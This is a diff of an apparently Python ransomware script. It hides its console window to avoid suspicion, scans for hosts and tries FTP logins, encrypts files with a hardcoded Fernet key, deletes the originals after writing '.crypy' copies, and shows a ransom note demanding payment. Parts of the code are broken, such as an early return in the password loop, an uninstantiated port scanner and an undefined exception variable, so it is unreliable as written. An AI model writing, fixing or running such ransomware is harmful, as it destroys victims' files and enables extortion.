@@ -10,77 +10,69 @@ from ftplib import FTP
 from tkinter import messagebox
 
 import nmap
-from threading import Thread
-import queue
 import win32con
 import win32gui
 from cryptography.fernet import Fernet
+import requests
 
 
-# Hides the terminal console to prevent suspicion while working in background
-hide = win32gui.GetForegroundWindow()
-win32gui.ShowWindow(hide, win32con.SW_HIDE)
-
-threads = 40
-q = queue.Queue()
-
-passwords = open('passwordlist.txt').read().split('\n')
-for password in passwords:
-    q.put(password)
+passwords = []
 
 
-def ftpwork():
-    global password
-    global q
-
-    ftpserver = ftplib.FTP_TLS()
+def ftp_work():
+    ftp_server = ftplib.FTP_TLS()
     user = 'anonymous'
     port = 21
-
+    for password in passwords:
+        return password
     host_list = []
     hosts = nmap.PortScanner
     h = hosts.all_hosts()
     host_list.append(h)
-
-    password = q.get()
     time.sleep(5)
-
-    for host in host_list:
+    while True:
         try:
-            ftpserver.connect(host, port)
-            ftpserver.login(user, password)
-            ftpserver.prot_p()
-            time.sleep(5)
-
-            filecontent = '*.*'
-            FTP.cwd('/home/FTP')
-            key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
-
-            for file in FTP.nlst(filecontent):
-                k = key
-                f = Fernet(k)
-                try:
-                    with open(file, "rb") as doc:
-                        file_data = doc.read()
-                        encrypted_data = f.encrypt(file_data)
-
-                    with open(file, "wb") as doc:
-                        doc.write(encrypted_data)
+            requests.get('https://kite.com')
+            while True:
+                pass_l = password
+                for host in host_list:
+                    try:
+                        ftp_server.connect(host, port)
+                        ftp_server.login(user, pass_l)
+                    except Exception as e:
+                        print(e)
+                        continue
+                    else:
+                        ftp_server.prot_p()
                         time.sleep(5)
 
-                except Exception as e:
-                    print(e)
-                    pass
+                        file_content = '*.*'
+                        ftp_server.pwd()
+                        key = "aWC5hXgG06c4lCmPpWxEuczPacxTa1TId-yw3hjZI9E="
+
+                        for file in FTP.nlst(file_content):
+                            k = key
+                            f = Fernet(k)
+                            try:
+                                with open(file, "rb") as doc:
+                                    file_data = doc.read()
+                                    encrypted_data = f.encrypt(file_data)
+
+                                with open(file + '.crypy', "wb") as doc:
+                                    doc.write(encrypted_data)
+                                    os.remove(file)
+                            except Exception as e:
+                                print(e)
+                                pass
+                        pass
+        except requests.exceptions.ConnectionError:
+            print(e)
+            break
         except Exception as e:
             print(e)
-            pass
+            break
         else:
-            with q.mutex:
-                q.queue.clear()
-                q.all_tasks_done.notify_all()
-                q.unfinished_tasks = 0
-        finally:
-            q.task_done()
+            pass
 
 
 def encrypt_file():
@@ -131,9 +123,9 @@ def encrypt_file():
                 with open(f_name, "rb") as file:
                     file_data = file.read()
                     encrypted_data = f.encrypt(file_data)
-                with open(f_name, "wb") as file:
+                with open(f_name + '.crypy', "wb") as file:
                     file.write(encrypted_data)
-                    time.sleep(5)
+                    os.remove(f_name)
             except Exception as e:
                 print(e)
                 pass
@@ -158,7 +150,8 @@ def ransom_note():
 WE HAVE COMPROMISED YOUR COMPUTER AND ENCRYPTED YOUR FILES
 PAY UP
 """)
-    except Exception:
+    except Exception as e:
+        print(e)
         pass
 
 
@@ -191,17 +184,15 @@ def delete_ransomware():
 
 
 def main():
-    for thread in range(threads):
-        threading = Thread(target=encrypt_file(), daemon=True)
-        threading.start()
+    # Hides the terminal console to prevent suspicion while working in background
+    hide = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(hide, win32con.SW_HIDE)
 
-    for thread in range(threads):
-        threading = Thread(target=ftpwork(), daemon=True)
-        threading.start()
-
+    encrypt_file()
     message()
-    ransom_note()
-    show_ransom_note()
+    # ransom_note()
+    # show_ransom_note()
+    # ftp_work()
     # delete_ransomware()
 
 
